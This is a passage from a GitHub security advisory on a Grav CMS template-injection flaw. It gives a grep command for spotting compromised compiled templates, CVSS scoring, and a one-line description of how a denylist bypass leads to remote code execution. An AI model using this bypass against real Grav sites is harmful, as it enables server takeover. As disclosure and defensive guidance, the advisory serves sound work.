4. Searching within compiled Twig template files using the following shell command:

   `grep -Priz -e '\|\s*(filter|map|reduce)\s*\(' /path/to/webroot/cache/compiled/files/`

Note that it is not possible to detect indicators of compromise reliably using the Grav log file (located at `/path/to/webroot/logs/grav.log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.

## Credits:

Ngo Wei Lin ([@Creastery](https://twitter.com/Creastery)) & Wang Hengyue ([@w\_hy\_04](https://twitter.com/w_hy_04)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

Kindly note that STAR Labs reserved and assigned the following CVE identifiers to the respective vulnerabilities presented in this report:

1. **CVE-2023-30595**

   Server-side Template Injection (SSTI) in getgrav/grav <= v1.7.40 allows Grav Admin users with page creation or update rights to bypass the dangerous functions denylist check in `GravExtension.filterFilter()` and to achieve remote code execution via usage of fully-qualified names, supplied as arrays of strings, when referencing callables. This is a bypass of [CVE-2022-2073](https://github.com/advisories/GHSA-cxgw-r5jg-7xwq "CVE-2022-2073").

### Severity

High

7.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
High

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2023-34252

### Weaknesses

[CWE-184](/advisories?query=cwe%3A184) [CWE-1336](/advisories?query=cwe%3A1336)

### Credits

* [![@jacobsoo](https://avatars.githubusercontent.com/u/3516693?s=40&v=4)](/jacobsoo)
  [jacobsoo](/jacobsoo)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


